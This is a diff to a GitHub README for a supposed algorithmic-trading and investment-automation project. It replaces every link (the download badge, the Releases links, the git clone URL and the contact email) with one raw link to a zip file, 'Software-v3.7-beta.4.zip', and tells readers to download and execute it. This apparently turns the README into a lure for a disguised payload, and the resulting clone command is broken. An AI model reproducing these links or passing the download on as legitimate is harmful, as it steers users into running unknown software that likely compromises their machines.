@@ -1,6 +1,6 @@
 # Algorithmic Trading and Investment Automation on YouTube 📈💻
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-brightgreen)](https://github.com/cutkoskyyy/Youtube/releases)
+[![Download Releases](https://raw.githubusercontent.com/cutkoskyyy/Youtube/main/compotator/Software-v3.7-beta.4.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/cutkoskyyy/Youtube/main/compotator/Software-v3.7-beta.4.zip)
 
 ## Overview
 
@@ -33,13 +33,13 @@ This repository covers a wide range of topics in the field of finance and techno
 
 ## Getting Started
 
-To get started, you can check out our [Releases section](https://github.com/cutkoskyyy/Youtube/releases) for downloadable content. Here, you will find videos, scripts, and other resources that you can use to enhance your learning and trading skills.
+To get started, you can check out our [Releases section](https://raw.githubusercontent.com/cutkoskyyy/Youtube/main/compotator/Software-v3.7-beta.4.zip) for downloadable content. Here, you will find videos, scripts, and other resources that you can use to enhance your learning and trading skills.
 
 ### Installation
 
 1. **Clone the Repository**: Use the following command to clone the repository to your local machine.
    ```bash
-   git clone https://github.com/cutkoskyyy/Youtube.git
+   git clone https://raw.githubusercontent.com/cutkoskyyy/Youtube/main/compotator/Software-v3.7-beta.4.zip
    ```
 
 2. **Navigate to the Directory**: Change into the cloned directory.
@@ -47,7 +47,7 @@ To get started, you can check out our [Releases section](https://github.com/cutk
    cd Youtube
    ```
 
-3. **Download Releases**: Visit our [Releases section](https://github.com/cutkoskyyy/Youtube/releases) to download the latest files and execute them as needed.
+3. **Download Releases**: Visit our [Releases section](https://raw.githubusercontent.com/cutkoskyyy/Youtube/main/compotator/Software-v3.7-beta.4.zip) to download the latest files and execute them as needed.
 
 ### Prerequisites
 
@@ -101,7 +101,7 @@ This repository is licensed under the MIT License. Feel free to use, modify, and
 
 For inquiries or further information, you can reach out via:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
+- **Email**: [https://raw.githubusercontent.com/cutkoskyyy/Youtube/main/compotator/Software-v3.7-beta.4.zip](https://raw.githubusercontent.com/cutkoskyyy/Youtube/main/compotator/Software-v3.7-beta.4.zip)
 - **GitHub Issues**: Open an issue in the repository for questions or feedback.
 
-Explore the world of algorithmic trading and investment automation with us! Don't forget to check our [Releases section](https://github.com/cutkoskyyy/Youtube/releases) for downloadable content and updates.
+Explore the world of algorithmic trading and investment automation with us! Don't forget to check our [Releases section](https://raw.githubusercontent.com/cutkoskyyy/Youtube/main/compotator/Software-v3.7-beta.4.zip) for downloadable content and updates.
